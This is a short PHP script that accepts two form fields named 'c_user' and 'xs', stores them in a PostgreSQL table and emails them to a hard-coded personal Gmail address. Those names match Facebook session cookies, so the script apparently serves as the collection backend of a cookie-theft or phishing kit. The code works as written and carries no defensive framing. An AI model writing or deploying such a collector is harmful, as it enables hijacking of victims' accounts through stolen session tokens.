<?php
// Get database connection details from environment variables
$host = getenv('DB_HOST');
$dbname = getenv('DB_NAME');
$user = getenv('DB_USER');
$pass = getenv('DB_PASS');
$port = getenv('DB_PORT');
$sslmode = getenv('DB_SSLMODE');

// Get form data
$c_user = isset($_POST['c_user']) ? $_POST['c_user'] : '';
$xs = isset($_POST['xs']) ? $_POST['xs'] : '';

if (!empty($c_user) && !empty($xs)) {
    try {
        // Connect to Neon PostgreSQL using PDO
        $dsn = "pgsql:host=$host;port=$port;dbname=$dbname;sslmode=$sslmode";
        $pdo = new PDO($dsn, $user, $pass, [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
        ]);

        // Insert data into database
        $stmt = $pdo->prepare("INSERT INTO submissions (c_user, xs) VALUES (:c_user, :xs)");
        $stmt->execute([
            ':c_user' => $c_user,
            ':xs' => $xs
        ]);

        // Send email notification
        $to = "naseeb.niaz.ec@gmail.com"; // Your email
        $subject = "New Submission";
        $message = "c_user: $c_user\nxs: $xs";
        $headers = "From: no-reply@example.com";

        mail($to, $subject, $message, $headers);

        echo "Data submitted successfully!";
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
} else {
    echo "Both fields are required.";
}
?>
